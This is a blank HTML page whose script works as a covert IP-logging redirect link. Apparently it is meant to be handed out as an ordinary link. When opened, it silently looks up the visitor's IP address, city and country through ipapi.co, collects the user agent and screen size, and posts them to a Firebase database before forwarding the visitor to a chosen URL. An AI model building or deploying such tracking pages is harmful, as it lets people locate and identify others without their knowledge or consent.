<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width"><title></title></head><body>
<script>
const FIREBASE="https://numgen-4f22c-default-rtdb.firebaseio.com";
const params=new URLSearchParams(location.search);
const id=params.get('id')||"unknown";
const target=params.get('url')||"https://google.com";
function logVisit(geo){
  const data={name:id,ip:geo.ip||"unknown",city:geo.city||"unknown",country:geo.country_name||"",device:navigator.userAgent,screen:screen.width+"x"+screen.height,timestamp:Date.now(),time:new Date().toLocaleString(),target_url:target};
  fetch(FIREBASE+"/white_label_clients/"+id+"/visitors.json",{method:"POST",body:JSON.stringify(data)});
  fetch(FIREBASE+"/no_code_visits/"+id+".json",{method:"POST",body:JSON.stringify(data)});
}
fetch("https://ipapi.co/json/").then(r=>r.json()).then(g=>{logVisit(g);setTimeout(()=>{location.href=target},300)}).catch(()=>{logVisit({});setTimeout(()=>{location.href=target},300)});
</script>
</body></html>
